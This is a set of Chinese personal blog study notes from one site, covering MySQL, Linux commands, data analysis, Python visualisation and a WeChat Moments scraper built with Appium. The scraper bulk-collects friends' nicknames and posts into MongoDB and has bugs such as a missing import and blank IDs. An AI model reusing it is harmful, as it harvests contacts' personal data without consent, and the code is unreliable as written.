准备工作首先是怎么安装，在安装之后开始使用，这段时间使用Linux，所以在Linux里面开始搭建使用。 虚拟机安装CentOS 7 安装VMware 创建一个虚拟机，然后进行按步骤进行安装，在选项中要记得设置好root密码，选择最小安装就可以。 安装MySQL MySQL的基本操作 创建数据库 登录MySQL服务器后，使用crate database &lt;name&gt;； 使用mysqladmin， mysqladmin u root -p create &lt;name&gt;； 删除数据库 同1中，使用drop database &lt;name&gt;； 同1中，使用mysqladmin -u root -p drop &lt;name&gt;； 选择数据库 use &lt;name&gt;； 创建数据库表 创建数据表需要： 表名 表字段名 定义每个表字段 语法：注意MySQL命令终止符为; CREATE TABLE ()ENGINE=InnoDB DEFAULT CHARSET=utf8； 删除数据表 DROP TABLE ； 插入数据 INSERT INTO TABLE_NAME(&lt;,&gt;VALUES&lt;,&gt;); 如果一条语句太长，可以通过enter键来创建新行编写 查询数据 SELECT column_name,column_name FROM TABLE_NAME [WHERE Clause] [LIMINT N][OFFSET M]; WHERE子句 … WHERE condition1 [AND][OR] condition2, …； 注意：子句中的字符串是不区分大小写的，要想区分开来需要添加WHERE BINARY关键字来限定 可以使用操作符来判断。如&gt;,&lt;,!=,&lt;=,&gt;=, 使用UPDATE查询 UPDATE TABLE_NAME SET field1=new-value1,…； 可以同时更新多个字符段，后面可添加WHERE子句 使DELETE DELETE FROM TABLE_NAME [WHERE Clause]； 其中WHERE子句可以实现制定条件的删除，否则就是表中的全部数据都被删除 LIKE子句 SELECT field1,field2,… FROM TABLE_NAME WHERE … LIKE …； 可以在WHERE中使用LIKE子句，可以使用LIKE 代替= 使用%来代替任意字符，类似于正则表达式中的* UNION操作符 操作符用于连接SELECT语句的结果组合到一个结果集合中。多个SELECT语句会删除重复的数据。 SELECT expression1,expression2,… FROM TABLE_NAME [WHERE Clause] UNION [ALL|DISTINCT] SELECT …； ALL代表返回所有结果集，包含重复数据 排序ORDER BY子句 SELECT field1, field2,…fieldN table_name1, table_name2… ORDER BY field1, [field2…] [ASC [DESC]]； 可以通过设置ASC DESC来设置升序还是降序 分组 SELECT column_name, function(column_name) FROM TABLE_NAME WHERE … GROUP BY column_name; 使用WITH ROOLUP可以实现分组统计数据基础上再进行相同的统计SELECT column_name, function(column_name) FROM TABLE_NAME WHERE … GROUP BY column_name WITH ROLLUP; 使用coalesce设置一个取代NULL 的名称coalesce(a,b,C)若a为NULL则使用b,以此类推，若全为空则设置为NULL 数据表的连接 INNER JOIN 内连接，获取两个表中相互匹配的字段 LEFT JOIN 左连接，获取左边表的全部数据，不管有没有匹配 RIGHT JOIN 右连接，类似上 SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author=b.runoob_author; 事务 主要用于处理操作两大，复杂度高的数据，一系列的数据库操作语句构成了事务，在MySQL中只有使用了InnoDB引擎的数据库或者表才支持事务，事务处理是为了维护数据库的完整性，要不进行完成彻底，要不就不变动。 事务满足四个条件（ACID）: 原子性：要么完成，要么不完成 一致性：事务完成前后数据库的完整性不会打破 隔离性：允许并发事务的同时对数据进行操作 持久性：事务结束之后，对数据的修改是永久的 事务的执行流程： BEGIN; ROLLBAK; COMMIT; 可以在提交之前任意点回滚到开始事务前，可以通过SET AUTOCOMMIT=0或1来设置是否自动提交 ALTER变更 当需要变更表中的字段或者修改表名时使用ALTER语句 ALTER TABLE TABLE_NAME DROP/ADD FIRST/AFTER I TYPE; ALTER TABLE TABLE_NAME RENAME TO NEW_NANE; 变更存储引擎；删除外键别名； 索引 索引可以提高数据库的检索速度，但是学数据结构的时候我们知道数组随机存取很快但是更新的速度相对会慢，索引也一样。 索引可以分为： 单列索引：一个索引包含一个列。 组合索引：一个索引包含多个列。 待补充","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://cxpeng.cn/tags/SQL/"},{"name":"数据库","slug":"数据库","permalink":"https://cxpeng.cn/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"Linux基础（一）","slug":"Linux基础（一）","date":"2019-03-25T12:52:01.000Z","updated":"2020-02-13T03:23:48.910Z","comments":true,"path":"archives/843f592a.html","link":"","permalink":"https://cxpeng.cn/archives/843f592a.html","excerpt":"","text":"一、Linux命令行1、什么是linux？Linux可分为内核（内存、文件系统、软件、硬件）、GNU工具（运用操作系统的一套标准工具；shell）、图形化桌面环境（文本操作界面演变为图形化操作界面：X Window、KDE、Unity、GNOME）、应用软件. Linux发行版（精简化定制类型的版本；专业版本，适合不同的办公应用环境）：Debian、Redhat、Centos、Ubuntu、Fedora、OpenSUSE等 2、什么是shell？ Shell:用户与操作系统之间交互工具（壳） 发展：CLI（文本界面）—&gt;命令终端仿真器/控制台终端 一般在图形化桌面环境中只要从菜单栏就可以找到虚拟控制台终端的入口：Terminal 3、基本shell命令命令提示符$:辅助提示功能 help/man 命令名称:查看命令使用手册 cd：遍历目录，.代表当前目录..代表当前目录的父目录 ls：文件目录显示 -F 区分文件和目录 -R递归显示目录 -la，同时还可以根据通配符进行有选择性的显示查看文件和目录信息 touch：创建文件 cp：复制文件，如果选择参数-i则会强制shell进行提示，-R都知道是递归的意思 ln 源文件 链接文件：创建链接文件 -s创建软连接，不加就是创建硬链接，注意区分软和硬的区别；所谓硬就是文件共享iNode编号，是一个文件。软链接只是指向了数据文件 mv：重命名剪切 rm：删除文件 mkdir：创建目录 rmdir：删除目录，注意是删除空目录。 file：查看文件类型 cat：查看整个文件 -n显示行号 -b只给文本显示行号 -T禁止显示制表符 more less tail head最为特殊的是head和tail分别是显示文件的前几行和后几行，可以通过参数-n number来控制显示的行数 ps：默认情况下只显示运行在当前控制台下的属于当前用户的进程。 -ef —forest可以展示嵌套结构 top：实时监控进程 kill pid：杀死进程 killall pid或者进程名称同时支持通配符：结束进程 参数-9强制结束进程 为了检测系统磁盘的使用情况，需要运用命令来帮助管理存储媒体mount -t type dev directory：挂载媒体到制定目录 umount：删除媒体设备卸载 df -h：显示每个有数据的已挂载的文件系统的磁盘使用情况 du -h：显示当前文件夹下的磁盘使用情况 sort：排序，用来处理文件数据的排序 -n识别数字 -M识别月 -t 指定分隔符 -k指定排序位置 grep：搜索查找数据；-v反向搜索， -n显示行号 可以使用正则表达式 gzip：压缩数据文件 .gz zip: .zip bzip2: .bz2 tar:文件归档，常用进行文件打包压缩备份，解压缩。 jobs：显示后台左右用户的进程（作业） coproc：协程，会在后台生成一份shell，并在这个新的shell中运行命令。并且可以和进程列表进行联合使用（命令；） &amp;：让命令到后台运行，就在命令后面添加$ which: type: pwd: history：显示命令使用记录。命令使用记录被保存在隐藏文件.bash_history中，位于用户的主目录中。bash的命令是先写入内存中，在shell退出时才被写入文件中。 printenv：查看全局变量 echo：回显命令 set：显示某个进程内设置的所有的环境变量 Export：将变量变为全局变量 unset：删除变量 4、初识环境变量以及怎么样设置环境变量环境变量： 局部环境变量 全局环境变量 如何设置环境变量 命令的可执行文件所在目录路径必须在PATH变量中，添加方式：PATH=$PATH:路径;环境变量可以作为数组使用，能够设置多个值，（值1 值2 值3） 5、文件管理及文件权限设置Linux将文件存储在单个目录结构中—虚拟目录，然后虚拟目录将安装在PC上所有的存储设备的文件路径纳入到单个目录结构中。虚拟目录结构只包含一个称为根目录的基础目录 /bin:存放用户级的GNU工具 /boot /dev：设备目录，创建设备节点 /etc：系统配置文件目录 /root：root用户的主目录 /usr：大量用户级的GNU工具和数据文件都存储在这里 /home：用户的家目录，linux在这里创建用户 /var：用于存放经常变化的文件，比如日志文件。 /lib：库目录，存放系统和应用程序的库文件 /lib4 /media：媒体文件，挂载可移动媒体设备的常用挂载点 /mnt：另一个可移动媒体设备的常用挂载点 /proc：进程目录，存放现有硬件以及当前进程的相关信息 /sbin：管理级别的GNU工具 /tmp /sys /srv:服务目录存放本地服务的相关文件 /etc/passwd文件存储用户信息 /etc/shadow存储用户的登录密码 用户添加、修改、删除 useradd、userdel、usermod（-l修改用户登录的用户名，-L锁定 -U解除锁定 -p修改账户密码） passwd：修改已有用户密码 chpasswd从文件中读取用户密码并更新， 大量修改用户密码时可以读取用户和密码对的文件chpasswd &lt; wenjian chsh：更改用户账户默认登录shell /etc/group文件 创建、修改、删除用户组 groupadd、groupmod、groupdel 更改权限chmod（ugoa）chown（更改属主）、chgrp（更改属组） 6、安装卸载更新程序的步骤了解包管理系统（PMS）： Debian下的是dpkg命令 前端工具：apt-get apt-cache aptitude； Redhat下的是rpm命令 前端工具：yum、urpm、zpper。 我们知道一些包的安装是需要一些依赖包的，在安装这类包之前，它的依赖包应该提前安装在本地。 aptitude安装软件包： aptitude search package_name找到特定的包， i已安装 p v可用未安装 aptitude install package_name aptitude safe_upgrade全部更新 aptitude purge package_name卸载包 yum安装包命令： yum list installed，列出已安装软件包 yum provides package_name可以看包归属 yum install package_name：安装包 本地安装localinstall *.rpm yum update yum remove package_name：删除软件包保留配置文件和数据文件 yum erase package_name：删除软件包和所有文件。 其他步骤： 下载安装包 a.gz 解压安装包 tar -zvxf a.gz 进入解压目录 cd b 进行安装 ./configure 进行编译 make make install 7、常见编辑器及其操作命令常见编辑器：vim、nano、emacs、KWrite、Kate、GNOME编辑器 检查别名alias name VIM：插入模式模式、命令模式、末行模式移动： k↑ j↓ h← l→ 复制、删除、剪切、粘贴： yw复制单词 y$复制到行尾dd删除 p粘贴 .重复上一操作 G移动到行首 gg光标移动到首行 wq保存退出 q！取消修改退出 zz保存退出 8、网络配置方法https://blog.csdn.net/rzc666/article/details/50491305 二、Shell脚本编程基础1、构建基本脚本 2、使用结构化命令 3、处理用户输入 4、呈现数据 5、控制脚本 三、 高级shell脚本编程1、创建函数 2、图形化界面进行脚本编程 3、正则表达式 4、Sed、awk 四、 脚本实例1、简单脚本工具 2、创建与数据库和web以及电子邮件有关的脚本","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://cxpeng.cn/tags/Linux/"}]},{"title":"数据分析与挖掘（一）","slug":"数据分析与挖掘_01","date":"2019-03-24T04:31:34.000Z","updated":"2020-02-13T03:25:31.857Z","comments":true,"path":"archives/9c2ffa7.html","link":"","permalink":"https://cxpeng.cn/archives/9c2ffa7.html","excerpt":"","text":"Q1、数据仓库（Data Warehouse, DW）和数据库的区别 数据仓库是一个很大的数据存储集合，出于企业的分析性报告和决策支持目的而创建。对于多种的业务数据进行筛选和整合，为企业提供一定的BI能力，知道业务流程改进、监视时间、成本、质量、控制。 数据仓库的输入方是各种各样的数据源，最终的输出用于企业的数据分析、数据挖掘、数据报表等方向。 数据仓库可以对数据库存储的同一主题的数据进行整合处理 不同源的数据整合依靠的是ETL,指的是Extract-Transform-Load过程，描述的是将数据从来源迁移到目标的过程（数据抽取-数据转换-数据加载） 数据仓库：Hive、Teradata、Oracle、Db2等 Q2、数据分析：怎么获取数据？ 从数据仓库中获取 数据监测，如传感器等的数据来源 利用爬虫获取 urllib、urllib2、request、scrapy等各种抓取包，爬虫涉及分布式爬虫、反爬虫技术等。 填写、埋点、日志。埋点记录用户与互联网交互过程；日志记录的信息更加精简，同时方便定位问题。一般以文件存储。包括前端日志、后端日志，前端日志需要加载到后端查看。 分析已有数据来进行计算，获得具有实际意义的数据。 Q3、学习资源 数据学习网站kaggle、天池、 数据网站：ImageNet/Open Images、 统计数据（统计局、公司财报、政府机构等） Q4、怎么进行数据探索拿到一个数据集，应该首先了解相关文档，熟悉文件中的统计名称。 对于数据集中的人数据我们可以先研究数据的分布趋势：集中趋势、离中趋势 集中趋势： 均值 中位数 分位数: (n+1)*[0.25,0.5,0.75]求解时要根据数据个数的奇偶分为求算 众数 离中趋势： 标准差 std() 方差 var() 1倍std（69%） 1.96倍std（95%）2.58倍std（99%） 数据分布： 偏态系数：正偏、负偏 峰态系数（对集中强度的衡量，数值越大峰值越尖）：正态分布的数据峰态系数一般是3，一般相差大于2（5）的话，那么就可以认为不是正态分布了。 常用分布为： 正态分布（标准正态分布） t分布 F分布 卡方分布 抽样:一是全量计算的成本比较大、二是不要进行全量计算就可以满足需求 分层抽样 等距抽样 … 数据分类： 定类：类别间没有差距的， 定序分类：数据间有了差距 定距分类：没有绝对零点。不能进行相应计算，如温度 定比分类：可以界定数据大小，如常用的度量数据等 单属性分析 异常值分析（连续使用分位数来求、离散、知识异常值） 对比分析（绝对数比较（数字直接进行比较）、相对数比较（结构部分和整体、比例（整体内的不同比例比较）、（比较，同质进行比较）、动态、强度（密度、人均等））怎么比较时间下进行比较（同比、环比）、空间（城市、部门、公司）、经验与计划（实施进度和排期的比较） 结构分析（部分与总体）（静态、动态） 分布分析：直接概率分布、判断是不是正态分布 极大似然 相关API max() min() median()中位数 var()方差 std()标准差 skew()偏态系数 kurt()峰态系数 quantitle()分位数 fillna() dropna(axis=0，how=‘any’) value_counts()可以添加bins左开有闭(] value_counts(normalize=True)按照比例进行分析 sort_index() 直方图histogram(value, bins=10);分成几份 histogram(value, bins=np.arrange(0,1,0.1)) 左闭右开[) groupby()分组 可以根据根据需要选择聚合方式。 apply() loc()切片","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"数据分析","slug":"数据分析","permalink":"https://cxpeng.cn/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"},{"name":"数据挖掘","slug":"数据挖掘","permalink":"https://cxpeng.cn/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"}]},{"title":"用Appium+Python爬取朋友圈实习信息","slug":"用Appium+Python爬取朋友圈实习信息","date":"2019-03-18T14:30:57.000Z","updated":"2020-02-13T03:25:36.232Z","comments":true,"path":"archives/45d22ee3.html","link":"","permalink":"https://cxpeng.cn/archives/45d22ee3.html","excerpt":"","text":"前期准备工作 安装MongoDB NoSQL 建议最后安装可视化环境，不然会面临卡在安装界面很长时间。 安装pymongo模块，pip3安装 安装Android开发环境，下载Android Studio，并安装相应的安卓SDK版本 安装JDK,需要使用java命令 安装Appium，从Github中下载；另外还需要安装模块appium，后边python程序需要做接口，安装具体方法：pip install Appium_Python_Client 使用过程中要电脑连接手机，打开手机调试开关。 一、关于Appium Appium是一种移动端的自动化测试工具，和PC端使用的Selenium类似，该工具可以驱动Android、iOS等设备完成自动化测试。 首先打开appium软件启动服务，相当于打开了一个Appium服务器，使用端口名称为：4723 然后Start Inspecter Session在进行如下配置：需要在用adb devices -l 获取你的手机设备名字(model字段的内容) 配置好之后点击Start Session进入微信登录界面如下，左边的窗口会实时显示手机屏幕信息，中间块显示每个块的信息，右边部分显示一些属性如xpath和id等。这个窗口是为了在后边编写代码时获取相应XPATH和ID的。 按照爬取流程可能用到的依次是登录、密码、下一步、发现、朋友圈、每条朋友圈的昵称、内容和分享的文章名。对了会出现提示你是否打开手机通讯录，需要在Appium中实际操作下，记录否的按钮对应的元素ID。 二、爬取朋友圈信息代码具体ID每个手机设备都不一样，需要自己在Appium中获取。 1import os2from appium import webdriver3from appium.webdriver.common.touch_action import TouchAction4from selenium.common.exceptions import NoSuchElementException5from selenium.webdriver.common.by import By6from selenium.webdriver.support.ui import WebDriverWait7from selenium.webdriver.support import expected_conditions as EC8from pymongo import MongoClient9from time import sleep1011# 平台12PLATFORM = 'Android'1314# 手机设备名称15DEVICE_NAME = 'TA_1054'1617# APP包名18APP_PACKAGE = 'com.tencent.mm'1920# 入口类名21APP_ACTIVITY = '.ui.LauncherUI'2223# Appium地址24DRIVER_SERVER = 'http://localhost:4723/wd/hub'25# 超时时间设置26TIMEOUT = 5002728# 微信手机号密码29USERNAME = 'NUMBER'30PASSWORD = 'PASSWD'3132# 滑动位置和距离33FLICK_START_X = 30034FLICK_START_Y = 30035FLICK_DISTANCE = 7003637# MongoDB配置38MONGO_URL = 'localhost'39MONGO_DB = 'moments'40MONGO_COLLECTION = 'moments'4142# 滑动间隔43SCROLL_SLEEP_TIME = 24445class Moments():46 def __init__(self):47 \"\"\"48 初始化49 \"\"\"50 # 驱动配置51 self.desired_caps = &#123;52 'platformName': PLATFORM,53 'deviceName': DEVICE_NAME,54 'appPackage': APP_PACKAGE,55 'appActivity': APP_ACTIVITY56 &#125;57 self.driver = webdriver.Remote(DRIVER_SERVER, self.desired_caps)58 self.wait = WebDriverWait(self.driver, TIMEOUT)59 self.client = MongoClient(MONGO_URL)60 self.db = self.client[MONGO_DB]61 self.collection = self.db[MONGO_COLLECTION]6263 def login(self):64 \"\"\"65 登录微信66 :return:67 \"\"\"68 # 登录按钮69 print('开始登陆')70 login = self.wait.until(EC.presence_of_element_located((By.ID, 'com.tencent.mm:id/e4g')))71 login.click()72 print('点击登录了')73 # 手机号74 phone = self.wait.until(EC.presence_of_element_located((By.ID, 'com.tencent.mm:id/kh')))75 phone.set_text(USERNAME)76 # 下一步77 next = self.wait.until(EC.element_to_be_clickable((By.ID, 'com.tencent.mm:id/axt')))78 next.click()79 # 密码80 password = self.wait.until(81 EC.presence_of_element_located((By.XPATH, '//*[@resource-id=\"com.tencent.mm:id/kh\"][1]')))82 password.set_text(PASSWORD)83 # 提交84 submit = self.wait.until(EC.element_to_be_clickable((By.ID, 'com.tencent.mm:id/axt')))85 submit.click()86 submit = self.wait.until(EC.element_to_be_clickable((By.ID, 'com.tencent.mm:id/az9')))87 submit.click()8889 def enter(self):90 \"\"\"91 进入朋友圈92 :return:93 \"\"\"94 # 点击发现95 tab = self.wait.until(96 EC.presence_of_element_located((By.ID, ' ')))97 tab.click()98 # 朋友圈99 moments = self.wait.until(EC.presence_of_element_located((By.ID, ' ')))100 moments.click()101102 def crawl(self):103 \"\"\"104 爬取105 :return:106 \"\"\"107 while True:108 # 当前页面显示的所有状态109 items = self.wait.until(110 EC.presence_of_all_elements_located(111 (By.XPATH, '//*[@resource-id=\"com.tencent.mm:id/avi\"]//android.widget.FrameLayout')))112 # 上滑113 self.driver.swipe(FLICK_START_X, FLICK_START_Y + FLICK_DISTANCE, FLICK_START_X, FLICK_START_Y)114 # 遍历每条状态115 for item in items:116 try:117 # 昵称118 nickname = item.find_element_by_id('com.tencent.mm:id/b5o').get_attribute('text')119 # 正文120 content = item.find_element_by_id('com.tencent.mm:id/ejc').get_attribute('text')121 # 获取分享的内容122 share = item.find_element_by_id('com.tencent.mm:id/czg').get_attribute('text')123 #创建存储内容124 data = &#123;125 'nickname': nickname,126 'content': content,127 'share': share,128 &#125;129 # 插入MongoDB130 self.collection.update(&#123;'nickname': nickname, 'content': content, 'share': share&#125;, &#123;'$set': data&#125;, True)131 sleep(SCROLL_SLEEP_TIME)132 except NoSuchElementException:133 pass134135 def main(self):136 \"\"\"137 入口138 :return:139 \"\"\"140 # 登录141 self.login()142 time.sleep(25)143 # 进入朋友圈144 self.enter()145 time.sleep(15)146 # 爬取147 self.crawl()148149if __name__ == '__main__':150 moments = Moments()151 time.sleep(6)152 moments.main() 使用Mongo保存的数据，可以通过打开MongoDB Compass打开数据库查看数据 这样的话，在我的朋友圈有个微信号实时发送实习信息，爬取后可以通过数据库检索，获取所有关于实习的信息。或者其他有趣的信息。 问题：从朋友圈中无法能够提取朋友发送朋友圈的时间信息，还需要在找资料解决。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"爬虫","slug":"爬虫","permalink":"https://cxpeng.cn/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"PYTHON编程：从入门到实践之数据可视化","slug":"PYTHON编程：从入门到实践之数据可视化","date":"2019-03-17T07:19:57.000Z","updated":"2020-02-13T03:24:19.336Z","comments":true,"path":"archives/270bf2b5.html","link":"","permalink":"https://cxpeng.cn/archives/270bf2b5.html","excerpt":"","text":"数据可视化 数据可视化是指的通过可视化来表示探索数据，与数据挖掘紧密相关，数据挖掘是指的使用代码来探索数据集的规律和关联。可视化的目的是为了简洁的展示给观看者数据的规律和意义。本文中使用的可视化模块为matplotlib和pygal 一、准备工作1.1安装matplotlib linux：sudo apt-get install python3-matplotlib windows:使用anaconda安装或者安装pip之后用pip install matplotlib mac OS：pip install —user matplotlib 1.2测试并进行简单绘画可以访问http://matlplotlib.org/ 的示例画廊，来查看相应图标的的代码 1#简单的折线图2import matplotlib.pyplot as plt3squares = [1,4,9,16,25]4plt.plot(squares)5plt.show() 1.3修改标签文字和线条粗细1plt.plot(squares, linewidth=size)#修改线条粗细2plt.title('name', fontsize=n)#修改图表名字3#给坐标轴加上标签4plt.xlabel('name', fontsize=n)5plt.ylabel('name', fontsize=n)6#设置刻度标记的大小7plt.tick_params(axis='both', labelsize=14)8#plot函数可以同时传入自变量和因变量9plt.plot(x, y, linewidth=14)101112#图标区域涂色13#利用plt.fill_between(x,y1,y2,facecolor='red',alpha=0.1)其中alpha设置透明度0为透明，1为不透明 1.4散点图1#scatter_squares.py2import matplotlib.pyplot as plt3plt.scatter(2, 4, s=200)#s可以设置散点的大小4plt.show() 1#绘制系列散点2import matplotlib.pyplot as plt34x=[1,2,3,4,5,6,7]5y=[3,4,6,8,3,4,5]6plt.scatter(x, y, c='yellow', edgecolor='none', s=100)#去除数据点的轮廓7plt.axis([0, 8, 0, 11])#设置坐标轴范围8plt.show() 1#绘制系列散点,并使用颜色映射colormap2import matplotlib.pyplot as plt34x=[1,2,3,4,5,6,7]5y=[3,4,6,8,3,4,5]6plt.scatter(x, y, c=y, cmap=plt.cm.Blues, edgecolor='none', s=100)#colormap颜色映射，看出数据的变化趋势7plt.axis([0, 8, 0, 11])#设置坐标轴范围8plt.show()9plt.savefig('filename', bbox_inches='tight')#自动保存图表，第二参数是裁掉多余空白区域 1.5随机漫步每次行走都是随机的，意味着方向不一定，行走步数不一定。 1.5.1创建RandWalk类1from random import choice2import matplotlib.pyplot as plt3class RandWalk():4 '''随机生成漫步数据的类'''56 def __init__(self, num_points=5000):7 '''初始化属性'''8 self.num_points = num_points9 self.x_values = [0]#随机漫步从（0,0）出发10 self.y_values = [0]1112 def fill_walk(self):13 '''计算随机漫步的所有点'''14 #不断漫步，直到达到指定的长度15 while len(self.x_values) &lt; self.num_points:16 #决定前进的方向和前进距离17 x_direction = choice([1,-1])18 x_distance = choice([0, 1, 2, 3, 4])19 x_step = x_direction * x_distance2021 y_direction = choice([1,-1])22 y_distance = choice([0, 1, 2, 3, 4])23 y_step = y_direction * y_distance2425 #拒绝原地踏步26 if x_step == 0 and y_step == 0:27 continue28 #计算下一个点的xy的值29 next_x = self.x_values[-1] + x_step30 next_y = self.y_values[-1] + y_step3132 #更新坐标值33 self.x_values.append(next_x)34 self.y_values.append(next_y)35#开始绘制36plt.figure(figsize=(10,6)) #可以传入的参数包括dpi像素，大小，背景色37rw = RandWalk()38rw.fill_walk()39plt.scatter(rw.x_values, rw.y_values, c=list(range(rw.num_points)), cmap=plt.cm.Blues, edgecolor='none', s=1)40#突出起点和终点41plt.scatter(0, 0, edgecolors='none', c='red', s=40)42plt.scatter(rw.x_values[-1], rw.y_values[-1], edgecolors='none', c='yellow', s=40)4344#隐藏坐标轴45plt.axes().get_xaxis().set_visible(False)46plt.axes().get_yaxis().set_visible(False)47plt.show() 1from random import choice2class RandWalk():3 '''随机生成漫步数据的类'''4 def __init__(self, num_points=5000):5 self.num_points = num_points6 self.x_values = [0]#随机漫步从（0,0）出发7 self.y_values = [0]89 def fill_walk(self):10 '''计算随机漫步的所有点'''11 #不断漫步，直到达到指定的长度12 while len(self.x_values) &lt; self.num_points:13 #决定前进的方向和前进距离14 x_direction = choice([1,-1])15 x_distance = choice([0, 1, 2, 3, 4])16 x_step = x_direction * x_distance1718 y_direction = choice([1,-1])19 y_distance = choice([0, 1, 2, 3, 4])20 y_step = y_direction * y_distance2122 #拒绝原地踏步23 if x_step == 0 and y_step == 0:24 continue25 #计算下一个点的xy的值26 next_x = self.x_values[-1] + x_step27 next_y = self.y_values[-1] +y_step2829 #更新坐标值30 self.x_values.append(next_x)31 self.y_values.append(next_y)32#开始绘制33plt.figure(figsize=(10,6))#可以传入的参数包括dpi像素，大小，背景色34rw = RandWalk()35rw.fill_walk()36plt.plot(rw.x_values, rw.y_values, linewidth=1)37#突出起点和终点38#plt.plot(0, 0, edgecolors='none', c='red', s=40)39#plt.plot(rw.x_values[-1], rw.y_values[-1], edgecolors='none', c='yellow', linewidth=4)4041plt.show() 1.6Pygal参考图表类画廊http://www.pygal.org 每个示例都包含产生代码。 1#掷骰子的类2from random import randint3import pygal45class Die():6 '''表示一个骰子的类'''7 def __init__(self, num_sides):8 self.num_sides = num_sides910 def roll(self):11 return randint(1,self.num_sides)12131415#测试上面的类是否可行16sides = 617die = Die(sides)18results = []1920for roll_num in range(1000):21 result = die.roll()22 results.append(result)2324#print(results)25num_values = []26#分析结果，做统计27for value in range(1,1+sides):28 values = results.count(value)29 num_values.append(values)3031#print(num_values)32#绘制直方图，将数据可视化33hist = pygal.Bar()3435hist.title= 'Results of rolling D6 1000 times'36hist.x_labels = ['1','2','3','4','5','6']37hist.x_title = 'num_values'38hist.y_title = 'Frequency of Result'39#add函数40hist.add('D6',num_values)41hist.render_to_file('die_visual.svg') 二、下载数据后的数据的处理下载后的数据文件一般分为两种格式： csv格式 用逗号隔开 json格式 列表中的元素是字典类型[{}, {}, {}] json.load() json.dump() 1import csv23filename = ''4with open(filename) as f:5 reader = csv.reader(f)6 header_csv = next(reader)7 #获取文件头的数据和索引8 for index,value = enumerate(header_csv):9 print(index+':'+value) File &quot;&lt;ipython-input-57-64c6bbc4aaa4&gt;&quot;, line 8 for index,value = enumerate(header_csv): ^ SyntaxError: invalid syntax 三、使用API1#导入requests模块，使用pygal来可视化数据2import requests3import pygal4from pygal.style import LightColorizedStyle as LCS, LightenStyle as LS567url = 'https://api.github.com/search/repositories?q=language:python&amp;sort=stars'89r = requests.get(url)10print('status code：', r.status_code)11reponse_dict = r.json()12print(reponse_dict.keys())#响应字典13#研究第一个仓库14repo_dicts = reponse_dict['items']15repo_dict = repo_dicts[0]16#第一个仓库包含的信息17print(len(repo_dict.keys()))18for key in sorted(repo_dict.keys()):19 print(key)20names,stars = [],[]21for repo_dict in repo_dicts:22 names.append(repo_dict['name'])23 stars.append(repo_dict['stargazers_count'])24my_style = LS('#333366',base_style=LCS)25chart = pygal.Bar(style=my_style, x_label_rotation=45, show_legend=False)26chart.title = 'Most-Starred Python Projects on Github'27chart.x_labels = names2829chart.add('',stars)30chart.render_to_file('python_repos.svg') status code： 200 dict_keys([&#39;total_count&#39;, &#39;incomplete_results&#39;, &#39;items&#39;]) 73 archive_url archived assignees_url blobs_url branches_url clone_url collaborators_url comments_url commits_url compare_url contents_url contributors_url created_at default_branch deployments_url description downloads_url events_url fork forks forks_count forks_url full_name git_commits_url git_refs_url git_tags_url git_url has_downloads has_issues has_pages has_projects has_wiki homepage hooks_url html_url id issue_comment_url issue_events_url issues_url keys_url labels_url language languages_url license merges_url milestones_url mirror_url name node_id notifications_url open_issues open_issues_count owner private pulls_url pushed_at releases_url score size ssh_url stargazers_count stargazers_url statuses_url subscribers_url subscription_url svn_url tags_url teams_url trees_url updated_at url watchers watchers_count 下面还有hacker news示例，就不再总结了，主要包括通过api请求资源，将响应按照json格式进行处理，最后进行信息提取展示。还是要熟练json的格式","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"数据分析","slug":"数据分析","permalink":"https://cxpeng.cn/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}]},{"title":"PYTHON编程：从入门到实践（学习笔记）","slug":"PYTHON编程：从入门到实践（学习笔记）","date":"2019-03-16T06:43:13.000Z","updated":"2020-02-13T03:24:23.021Z","comments":true,"path":"archives/8409c1ac.html","link":"","permalink":"https://cxpeng.cn/archives/8409c1ac.html","excerpt":"","text":"Python基础一、安装1、版本v2.x v3.x 2、操作系统LINUX、WINDOWS、MAC OS 3、管理工具安装anaconda、操作命令安装 二、变量和简单数据类型2.1变量用来保存存储的内容 2.2字符串 一系列字符。 创建字符串“” capitalize():首字母大写string.capitalize()——-&gt;String center():居中，参数添加显示字符宽度 chr() cmp() count()计数 decode()解码 encode()编码 endswith()判断是否以某段字符结尾 expandtabs() find()查找字符串中的位置，返回第一个查找到的下标 format()格式化字符串 hex() index()返回索引值 isalnum() isalpha isdecimal() isdigit() islower() isnumeric() isspace() istitle()是否首字母大写 isupper()是否全部大写 join()连接 len()计算出长度 list()转换为字符串 ljust()左对齐，传入参数表示显示字符宽度 lower()将所有大写变为小写 lstrip()去掉左边空格 max() min() oct() ord() partition()以参数中的字符分区 replace() repr() rfind()从左边查找，返回下标索引 rindex() rjust()右对齐 rpartition()从右边开始查找分区的字符 rsplit()拆分字符 rstrip() split() splitlines() startswith() str() strip() swapcase() translate() tuple() type() upper() zfill()填充0 合并拼接字符串：可以使用+ 使用制表符\\t和换行符\\n 删除空白：rstrip()、lstrip()、strip() 要注意’’ 和 `的区别 如果在一起使用的话可以从trackback中看到错误信息 2.3数字加减乘除、乘方运算(**)、取余% 整数： +-*/ 注意地板除(//)向下取整 浮点数： 使用str()来避免类型错误 2.4注释 使用注释的目的是阐述代码要做什么 